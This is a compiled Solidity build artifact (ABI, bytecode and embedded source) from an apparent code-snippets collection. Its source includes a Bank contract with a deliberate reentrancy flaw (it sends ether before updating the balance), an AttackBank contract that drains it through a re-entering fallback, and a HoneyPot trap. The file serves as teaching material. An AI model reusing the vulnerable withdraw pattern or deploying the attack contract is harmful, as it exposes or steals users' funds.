{
  "contractName": "Logger",
  "abi": [
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "address",
          "name": "caller",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        },
        {
          "indexed": false,
          "internalType": "string",
          "name": "action",
          "type": "string"
        }
      ],
      "name": "Log",
      "type": "event"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_caller",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "_amount",
          "type": "uint256"
        },
        {
          "internalType": "string",
          "name": "_action",
          "type": "string"
        }
      ],
      "name": "log",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b50610403806100206000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c8063a1f2e8aa14610030575b600080fd5b61004a6004803603810190610045919061027a565b61004c565b005b7f4e3358e5bdb38f499a83fbcd33d16343569f3b6fe53021022dede6364017b4a883838360405161007f9392919061038f565b60405180910390a1505050565b6000604051905090565b600080fd5b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100cb826100a0565b9050919050565b6100db816100c0565b81146100e657600080fd5b50565b6000813590506100f8816100d2565b92915050565b6000819050919050565b610111816100fe565b811461011c57600080fd5b50565b60008135905061012e81610108565b92915050565b600080fd5b600080fd5b6000601f19601f8301169050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b6101878261013e565b810181811067ffffffffffffffff821117156101a6576101a561014f565b5b80604052505050565b60006101b961008c565b90506101c5828261017e565b919050565b600067ffffffffffffffff8211156101e5576101e461014f565b5b6101ee8261013e565b9050602081019050919050565b82818337600083830152505050565b600061021d610218846101ca565b6101af565b90508281526020810184848401111561023957610238610139565b5b6102448482856101fb565b509392505050565b600082601f83011261026157610260610134565b5b813561027184826020860161020a565b91505092915050565b60008060006060848603121561029357610292610096565b5b60006102a1868287016100e9565b93505060206102b28682870161011f565b925050604084013567ffffffffffffffff8111156102d3576102d261009b565b5b6102df8682870161024c565b9150509250925092565b6102f2816100c0565b82525050565b610301816100fe565b82525050565b600081519050919050565b600082825260208201905092915050565b60005b83811015610341578082015181840152602081019050610326565b83811115610350576000848401525b50505050565b600061036182610307565b61036b8185610312565b935061037b818560208601610323565b6103848161013e565b840191505092915050565b60006060820190506103a460008301866102e9565b6103b160208301856102f8565b81810360408301526103c38184610356565b905094935050505056fea264697066735822122088484ac3b2b8cbc2c8497bcee321e2067eeae06e3364a020f140e304f807ef4364736f6c634300080b0033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.10;\n\ncontract Logger {\n    event Log(address caller, uint amount, string action);\n\n    function log(\n        address _caller,\n        uint _amount,\n        string memory _action\n    ) public {\n        emit Log(_caller, _amount, _action);\n    }\n}\n\ncontract Bank {\n    mapping(address => uint) public balances;\n    Logger logger;\n\n    constructor(Logger _logger) {\n        logger = Logger(_logger);\n    }\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n        logger.log(msg.sender, msg.value, \"deposit\");\n    }\n\n    function withdraw(uint _amount) public {\n        require(_amount <= balances[msg.sender], \"insufficient funds\");\n\n        (bool sent, ) = msg.sender.call{value: _amount}(\"\");\n        require(sent, \"failed to send ether\");\n\n        balances[msg.sender] -= _amount;\n\n        logger.log(msg.sender, _amount, \"withdraw\");\n    }\n}\n\ncontract AttackBank {\n    Bank bank;\n\n    constructor(Bank _bank) {\n        bank = Bank(_bank);\n    }\n\n    fallback() external payable {\n        if (address(bank).balance >= 1 ether) {\n            bank.withdraw(1 ether);\n        }\n    }\n\n    function attack() public payable {\n        bank.deposit{value: 1 ether}();\n        bank.withdraw(1 ether);\n    }\n\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n\ncontract HoneyPot {\n    function log(\n        address _caller,\n        uint _amount,\n        string memory _action\n    ) public {\n        if (equal(_action, \"withdraw\")) {\n            revert(\"it's a trap\");\n        }\n    }\n\n    function equal(string memory _a, string memory _b) public pure returns (bool) {\n        return keccak256(abi.encode(_a)) == keccak256(abi.encode(_b));\n    }\n}",
  "sourcePath": "/Users/mac/Documents/GitHub/CodeSnippets/Solidity/polygon/contracts/Bank.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.11+commit.d7f03943.Emscripten.clang"
  },
  "schemaVersion": "3.4.4",
  "updatedAt": "2021-12-25T14:54:40.638Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}